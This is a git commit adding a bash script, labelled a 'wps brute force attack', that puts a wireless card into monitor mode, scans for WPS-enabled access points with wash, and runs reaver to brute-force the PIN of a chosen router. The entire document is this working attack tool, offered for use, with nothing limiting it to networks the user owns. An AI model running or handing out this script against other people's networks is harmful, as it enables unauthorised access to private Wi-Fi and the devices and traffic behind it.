9b66a0b2aa2ad413a841c6ccac30377b8f2f505e
Krzysztof Kuczewski <k.kuczewski10@protonmail.com>
2025-06-24 13:01:14 +0200

    Added a wps brute force attack

---
+++ get-wps.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+mode=$(iwconfig "${INTERFACE}" | grep "Mode:" | awk '{print $4}')
+if [ "${mode}" = "Mode:Managed" ]; then
+    sudo ifconfig "${INTERFACE}" down
+    sudo iwconfig "${INTERFACE}" mode monitor
+    sudo ifconfig "${INTERFACE}" up
+fi
+
+echo -e "Press ctrl+c when scanning finishes\n"
+sudo wash -i "$INTERFACE"
+
+read -p "bssid?: " bssid
+read -p "channel?: " channel
+read -p "use 5ghz? (y/n): " ghz
+if [ "$ghz" = "n" ]; then
+    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
+elif [ "$ghz" = "y" ]; then
+    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
+fi
